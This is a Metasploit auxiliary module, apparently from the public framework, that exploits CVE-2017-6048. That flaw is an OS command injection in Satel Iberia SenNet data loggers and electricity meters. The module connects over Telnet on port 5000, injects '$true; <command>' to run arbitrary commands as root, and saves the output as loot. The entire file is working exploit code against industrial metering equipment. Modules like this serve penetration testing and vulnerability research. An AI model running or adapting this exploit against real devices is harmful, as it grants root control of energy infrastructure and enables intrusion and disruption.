##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability',
      'Description' => %q{
        This module exploits an OS Command Injection vulnerability in Satel Iberia SenNet Data Loggers & Electricity Meters
        to perform arbitrary command execution as 'root'.
      },
      'References'     =>
        [
          [ 'CVE', '2017-6048' ],
          [ 'URL', 'https://ipositivesecurity.com/2017/04/07/sennet-data-logger-appliances-and-electricity-meters-multiple-vulnerabilties/' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-131-02' ]
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'DisclosureDate' => 'Apr 07, 2017',
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => true })
      )

    register_options(
      [
        Opt::RPORT(5000),
        OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30]),
        OptString.new('CMD', [true, 'Command(s) to run', 'id'])
      ], self.class
    )

    deregister_options('USERNAME', 'PASSWORD')
  end

  def run_host(ip)
    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
    begin
      ::Timeout.timeout(to) do
        command = datastore['CMD']
        inject = "$true; #{command}"
        res = connect

        print_status("Sending command now - #{command}")

        sock.puts(inject)
        data = sock.get_once(-1, to)
        print_good("#{data}")

        loot_name = 'cmd-exec-log'
        loot_type = 'text/plain'
        loot_desc = 'Satel SenNet CMD Exec Dump'
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)
        print_good("File saved in: #{p}")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Connection Failed...")
      return false
    ensure
      disconnect
    end
  end
end
